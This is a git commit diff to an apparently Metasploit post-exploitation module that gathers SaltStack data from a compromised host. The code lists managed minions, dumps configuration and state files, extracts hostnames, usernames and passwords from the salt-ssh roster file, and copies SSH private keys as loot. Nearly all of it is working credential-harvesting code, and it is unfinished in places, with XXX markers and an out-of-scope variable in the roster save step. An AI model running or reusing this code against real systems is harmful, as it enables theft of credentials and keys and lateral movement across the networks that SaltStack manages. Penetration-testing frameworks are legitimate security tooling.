600007a0d7d1a679ebb25bf56a0bcb0f69d64968
h00die <michaeltcyr@gmail.com>
2020-11-26 11:11:37 -0500

    worked out a bunch of syntax and added some catches

--- modules/post/multi/gather/saltstack.rb
+++ modules/post/multi/gather/saltstack.rb
@@ -24,16 +24,53 @@ class MetasploitModule < Msf::Post
     )
   end
 
+  def get_minions
+    # pull minions from a master
+    print_status('Attempting to list minions')
+    unless command_exists?('salt-key')
+      print_error('salt-key not present on system')
+      return
+    end
+    begin
+      minions = YAML.load(cmd_exec('salt-key -L --output=yaml'))
+    rescue Psych::SyntaxError
+      print_error('Unable to load salt-key -L data')
+      return
+    end
+
+    tbl = Rex::Text::Table.new(
+      'Header'  => 'Minions List',
+      'Indent'   => 1,
+      'Columns' => ['Status', 'Minion Name']
+    )
+
+    store_path = store_loot('saltstack_minions', "application/x-yaml", session, minions.to_yaml, "minions.yaml", "SaltStack salt-key list")
+    print_good("#{peer} - minion file successfully retrieved and saved on #{store_path}")
+    # XXX check these
+    minions['minions'].each do |minion|
+      tbl << ['Accepted', minion]
+    end
+    minions['minions_pre'].each do |minion|
+      tbl << ['Unaccepted', minion]
+    end
+    minions['minions_rejected'].each do |minion|
+      tbl << ['Rejected', minion]
+    end
+    minions['minions_denied'].each do |minion|
+      tbl << ['Denied', minion]
+    end
+    print_good(tbl.to_s)
+  end
+
   def minion
     # XXX ask salt for minion file?
+    print_status('Looking for salt minion config files')
     [ '/usr/local/etc/salt/minion', # freebsd
       '/etc/salt/minion']. each do |config|
       next unless file?(config)
       minion = YAML.load(read_file(config))
       if minion['master']
-        minion['master'].each do |master|
-          print_good("Minion master: #{master}")
-        end
+        print_good("Minion master: #{minion['master']}")
       end
       store_path = store_loot('saltstack_minion', "application/x-yaml", session, minion.to_yaml, "minion.yaml", "SaltStack Minion File")
       print_good("#{peer} - minion file successfully retrieved and saved on #{store_path}")
@@ -41,61 +78,46 @@ class MetasploitModule < Msf::Post
   end
 
   def master
-    # pull minions
-    minions = YAML.load(cmd_exec('salt-key -L'))
-    store_path = store_loot('saltstack_minions', "application/x-yaml", session, minions.to_yaml, "minions.yaml", "SaltStack salt-key list")
-    print_good("#{peer} - minion file successfully retrieved and saved on #{store_path}")
-    # XXX check these
-    if minions['accepted']
-      print_good('Accepted minions')
-      minions['accepted'].each do |minion|
-        print_good("  #{minion}")
-      end
-    end
-    if minions['unaccepted']
-      print_status('Unaccepted minions')
-      minions['unaccepted'].each do |minion|
-        print_status("  #{minion}")
-      end
-    end
-    if minions['rejected']
-      print_bad('Rejected minions')
-      minions['rejected'].each do |minion|
-        print_bad("  #{minion}")
-      end
-    end
-    if minions['denied']
-      print_bad('Denied minions')
-      minions['denied'].each do |minion|
-        print_bad("  #{minion}")
-      end
-    end
+    get_minions
 
     # get sls files
-    cmd_exec("salt '*' state.show_sls '*'")
+    unless command_exists?('salt')
+      print_error('salt not found on system')
+      return
+    end
+    print_status('Show SLS XXX')
+    puts cmd_exec("salt '*' state.show_sls '*'")
     # XXX do what with this info...
 
     # get roster
     # XXX ask salt where the roster file is
     # https://docs.saltstack.com/en/latest/topics/ssh/roster.html
+    print_status('Loading roster')
     priv_to_retrieve = []
-    config = '/etc/salt/roster'
-    next unless file?(config)
-    minions = YAML.load(read_file(config)
-    minions.each do |minion|
-      host = minion['host']
-      user = minion['user']
-      passwd = minion['passwd']
-      sudo = minion['sudo'] || false
-      priv = minion['priv'] || false
-      unless priv_to_retrieve.include?priv
-        priv_to_retrieve.append(priv)
+    ['/etc/salt/roster'].each do |config|
+      next unless file?(config)
+      begin
+        minions = YAML.load(read_file(config))
+      rescue Psych::SyntaxError
+        print_error("Unable to load #{config}")
+        next
       end
-      priv_pass = minion['priv_passwd'] || false
-      print_good("Minion master: #{minion['master']}")
+      next if minions == false
+      minions.each do |minion|
+        host = minion['host']
+        user = minion['user']
+        passwd = minion['passwd']
+        sudo = minion['sudo'] || false
+        priv = minion['priv'] || false
+        unless priv_to_retrieve.include?(priv)
+          priv_to_retrieve.append(priv)
+        end
+        priv_pass = minion['priv_passwd'] || false
+        print_good("Minion master: #{minion['master']}")
+      end
+      store_path = store_loot('saltstack_roster', "application/x-yaml", session, minion.to_yaml, "roster.yaml", "SaltStack Roster File")
+      print_good("#{peer} - roster file successfully retrieved and saved on #{store_path}")
     end
-    store_path = store_loot('saltstack_roster', "application/x-yaml", session, minion.to_yaml, "roster.yaml", "SaltStack Roster File")
-    print_good("#{peer} - roster file successfully retrieved and saved on #{store_path}")
     priv_to_retrieve.each do |f|
       input = read_file(f)
       store_path = store_loot('ssh_key', "plain/txt", session, input, "salt-ssh.rsa", "SaltStack SSH Private Key")
@@ -107,8 +129,8 @@ class MetasploitModule < Msf::Post
     if session.platform == 'windows'
       fail_with(Failure::Unknown, 'This module does not support windows')
     end
-    minion
-    master
+    minion if command_exists?('salt-minion')
+    master if command_exists?('salt-master')
   end
 
 end
